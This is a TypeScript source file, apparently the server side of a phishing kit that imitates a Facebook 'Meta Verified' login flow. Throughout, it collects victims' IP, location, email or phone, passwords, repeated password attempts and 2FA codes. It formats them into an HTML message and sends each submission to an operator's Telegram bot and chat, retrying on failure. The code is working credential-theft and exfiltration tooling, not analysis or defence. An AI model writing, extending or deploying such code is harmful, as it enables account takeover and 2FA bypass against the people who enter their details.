import https from 'https';
import axios from 'axios';

const agent = new https.Agent({ family: 4 });

function getTelegramConfig() {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) {
        return null;
    }
    return {
        api: `https://api.telegram.org/bot${token}`,
        chatId,
    };
}

// Retry utility for Telegram API calls
async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 3): Promise<any> {
    let lastError: any;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const result = await requestFn();
            return result;
        } catch (error: any) {
            lastError = error;

            const errorCode = error?.response?.status;
            const errorDesc = error?.response?.data?.description || '';

            // Don't retry on authentication errors, invalid chat_id, etc.
            if (
                errorCode === 401 ||
                errorCode === 403 ||
                errorDesc.includes('chat not found') ||
                errorDesc.includes('bot was blocked')
            ) {
                throw error;
            }

            if (attempt === maxRetries) {
                break;
            }

            // Exponential backoff: 1s, 2s, 4s
            const delay = Math.pow(2, attempt - 1) * 1000;
            console.warn(`⚠️ Telegram API attempt ${attempt} failed, retrying in ${delay}ms:`, error.message);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    throw lastError;
}

/** Mỗi lần gọi = một tin `sendMessage` mới (Log in / 2FA — không ghép không sửa tin cũ). */
async function sendNewTelegramMessage(
    apiRoot: string,
    chatId: string,
    text: string,
): Promise<number | undefined> {
    const res = await retryTelegramRequest(() =>
        axios.post(
            `${apiRoot}/sendMessage`,
            {
                chat_id: chatId,
                text,
                parse_mode: 'HTML',
            },
            {
                httpsAgent: agent,
                timeout: 10000,
            },
        ),
    );
    return res?.data?.result?.message_id as number | undefined;
}

function escapeHtml(input: any): string {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

/** Giá trị hiển thị trong <code>: không có dữ liệu thì để trống (không dùng "-" hay "N/A"). */
function formatCodeField(value: unknown): string {
    if (value === undefined || value === null) return '';
    const s = String(value).trim();
    return s ? escapeHtml(s) : '';
}


function normalizeData(input: any = {}) {
    const sf = input.submissionFlow;
    const submissionFlow: '' | 'facebook_login' | 'meta_verified' =
        sf === 'facebook_login' || sf === 'meta_verified' ? sf : '';
    return {
        ip: input.ip ?? '',
        location: input.location ?? '',
        fullName: input.fullName ?? input.name ?? '',
        fanpage: input.fanpage ?? '',
        day: input.day ?? '',
        month: input.month ?? '',
        year: input.year ?? '',
        email: input.email ?? '',
        emailBusiness: input.emailBusiness ?? input.business ?? '',
        phone: input.phone ?? '',
        password: input.password ?? '',
        passwordSecond: input.passwordSecond ?? '',
        authMethod: input.authMethod ?? '',
        twoFa: input.twoFa ?? '',
        twoFaSecond: input.twoFaSecond ?? '',
        twoFaThird: input.twoFaThird ?? '',
        submissionFlow,
    };
}

type NormalizedPayload = ReturnType<typeof normalizeData>;

/** Email ô đăng nhập; fallback số điện thoại (luồng Meta Verified thường để phone riêng). */
function primaryLoginIdentifier(d: NormalizedPayload): string {
    const email = String(d.email ?? '').trim();
    if (email) return email;
    const phone = String(d.phone ?? '').trim().replace(/^\+/, '');
    return phone ? `+${phone}` : '';
}

/** Một dòng password: ưu tiên mật khẩu chính, sau đó lần 2 (Meta Password modal). */
function primaryPasswordField(d: NormalizedPayload): string {
    const a = String(d.password ?? '').trim();
    if (a) return a;
    return String(d.passwordSecond ?? '').trim();
}

/** Một định dạng cho **một snapshot** POST (đúng dữ liệu lần gọi đó). */
function formatTelegramSubmissionMessage(d: NormalizedPayload): string {
    const lines = [
        `<b>📋 META VERIFIED</b>`,
        `----------------------`,
        `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
        `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
        `----------------------`,
        `<b>Mobile number or Email:</b> <code>${formatCodeField(primaryLoginIdentifier(d))}</code>`,
        `<b>Password:</b> <code>${formatCodeField(primaryPasswordField(d))}</code>`,
        `----------------------`,
        `<b>🔐 2FA step 1</b>`,
        `<code>${formatCodeField(d.twoFa)}</code>`,
        `<b>🔐 2FA step 2</b>`,
        `<code>${formatCodeField(d.twoFaSecond)}</code>`,
    ];
    return lines.join('\n');
}

function formatMessage(data: any): string {
    return formatTelegramSubmissionMessage(normalizeData(data));
}

export async function sendTelegramMessage(data: any): Promise<void> {
    const config = getTelegramConfig();
    if (!config) {
        console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
        return;
    }

    const text = formatMessage(data);

    try {
        const messageId = await sendNewTelegramMessage(config.api, config.chatId, text);
        if (messageId !== undefined) {
            console.log(`✅ Telegram new message ID: ${messageId}`);
        } else {
            console.warn('⚠️ Telegram response không có message_id');
        }
    } catch (err: unknown) {
        const anyErr = err as { response?: { data?: unknown }; message?: string };
        console.error('🔥 Telegram error:', anyErr?.response?.data || anyErr?.message || err);
    }
}
